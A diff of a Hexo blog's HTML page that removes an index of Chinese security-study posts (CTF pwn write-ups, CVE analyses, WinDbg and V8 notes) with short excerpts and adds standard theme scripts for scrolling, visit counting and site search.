-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/25/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">
-										UAF漏洞简单学习
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/17/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/">
-										V8漏洞初学习
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/31/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/">
-										WinDbg使用整理
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/25/%E5%88%9D%E8%AF%86Meterpreter/">
-										初识Meterpreter
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">
-										攻防世界-pwn-dice_game
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/">
-										攻防世界-pwn-level3
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/">
-										攻防世界-pwn-stack2
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/">
-										攻防世界-pwn-反应釜开关控制
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/">
-										攻防世界pwn-100
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/">
-										攻防世界pwn-cgpwn2
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/">
-										攻防世界pwn-guess_num
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/">
-										攻防世界pwn-int_overflow
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/">
-										攻防世界pwn-string
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/20/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9ACVE-2010-2883/">
-										漏洞战争学习笔记1：CVE-2010-2883
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/31/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/">
-										漏洞战争学习笔记2：CVE-2010-3333
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-		</div>
-	</div>
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
 </div>
-
-	<!-- 引入正文 -->
-	<div id="content">
-		<div id="index">
-	
-		<div class="index-li">
-			<a href="/2020/08/13/CVE-2006-3439/">
-				<h2 class="index-title">
-					CVE-2006-3439
-				</h2>
-				<div class="index-brief">
-					
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-08-13</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-		<div class="index-li">
-			<a href="/2020/07/31/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/">
-				<h2 class="index-title">
-					WinDbg使用整理
-				</h2>
-				<div class="index-brief">
-					0x00 基础命令
-.sympath　　//显示设置的符号表路径
-.reload　　　　//此命令主要用于加载符号表。
-.reload /f　　//重新装载模块
-.reload /i　　//强制加载mismatched symbol
-U　　//这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-07-31</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-		<div class="index-li">
-			<a href="/2020/07/31/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/">
-				<h2 class="index-title">
-					漏洞战争学习笔记2：CVE-2010-3333
-				</h2>
-				<div class="index-brief">
-					0x01 分析环境os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。
-操作系统：windows XP SP3虚拟机：VM调试器：WinDbg、OD、IDAoffice
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-07-31</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-		<div class="index-li">
-			<a href="/2020/07/30/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/">
-				<h2 class="index-title">
-					SQL学习与整理
-				</h2>
-				<div class="index-brief">
-					0x01 SQL简介SQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。
-SQL是关系数据库系统的标准语言，是一种ANSI标准的计算机语言。
-要创建一个显示数据库中的数据的网站，需要：
-
-一个RDBMS数据库程序（MS Access SQL Server MySQL）
-使用服务
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-07-30</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-		<div class="index-li">
-			<a href="/2020/07/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/">
-				<h2 class="index-title">
-					攻防世界-pwn-stack2
-				</h2>
-				<div class="index-brief">
-					0x01 分析checksec检查：
-
-32位，无PIE，开了NX和canary.运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。
-IDA中查看main函数：
-123456789101112131415161718192021222324252627282930313233343536
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-07-27</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-		<div class="index-li">
-			<a href="/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">
-				<h2 class="index-title">
-					攻防世界-pwn-dice_game
-				</h2>
-				<div class="index-brief">
-					0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护：
-
-0x02 分析IDA打开，主函数：
-123456789101112131415161718192021222324252627282930313233343536373839__int64 __fas
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-07-22</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-		<div class="index-li">
-			<a href="/2020/07/20/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9ACVE-2010-2883/">
-				<h2 class="index-title">
-					漏洞战争学习笔记1：CVE-2010-2883
-				</h2>
-				<div class="index-brief">
-					漏洞背景介绍CVE-2010-2883是Adobe Reader 和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的pdf文件就有可能导致执行任意代码。
-分析环境操作系统：Windows XP SP3调试器：Oll
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-07-20</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-		<div class="index-li">
-			<a href="/2020/07/17/JIT%E5%AD%A6%E4%B9%A0/">
-				<h2 class="index-title">
-					JIT学习
-				</h2>
-				<div class="index-brief">
-					JIT原理Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。
-还有一
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-07-17</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-		<div class="index-li">
-			<a href="/2020/07/17/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/">
-				<h2 class="index-title">
-					V8漏洞初学习
-				</h2>
-				<div class="index-brief">
-					V8基础v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的
-
-v8编译后二进制名称叫d8.
-
-allow-natives-syntax选项定义了一些v8运行时支持函数，以便于本地调试：
-123456789browser&#x2F;x64.release$ 
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-07-17</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-		<div class="index-li">
-			<a href="/2020/07/17/CVE-2020-6418/">
-				<h2 class="index-title">
-					CVE-2020-6418
-				</h2>
-				<div class="index-brief">
-					背景(资料来自绿盟科技)
-2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.
-CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2020-07-17</span>
-                    
-                            
-                    
-                </div>
-		</div>	
-	
-	
-	<div id="index-paginator">
-		
-			<span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&gt;</a>
-		
-	</div>
-</div>
-
-	</div>
-	<div id="footer">
-	<p>
-	©2019-<span id="footerYear"></span> 
-	<a href="/">Sinky-wang</a> 
-	
-	
-		|
-		<span id="busuanzi_container_site_pv">
-			pv
-			<span id="busuanzi_value_site_pv"></span>
-		</span>
-		|
-		<span id="busuanzi_container_site_uv"> 
-			uv
-			<span id="busuanzi_value_site_uv"></span>
-		</span>
-	
-	<br>
-	Theme <a href="//github.com/wujun234/hexo-theme-tree" target="_blank">Tree</a>
-	by <a href="//github.com/wujun234" target="_blank">WuJun</a>
-	Powered by <a href="//hexo.io" target="_blank">Hexo</a>
-	</p>
-</div>
-<script type="text/javascript"> 
-	document.getElementById('footerYear').innerHTML = new Date().getFullYear() + '';
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
 </script>
-	<button id="totop-toggle" class="toggle"><i class="fa fa-angle-double-up" aria-hidden="true"></i></button>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+    <script type="text/javascript">
+      window.onload = function(){
+        document.getElementById("search").onclick = function(){
+            console.log("search")
+            search();
+        }
+      }
+      function search(){
+        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
+      }
+    </script>
+
+  </div>
 </body>
 </html>
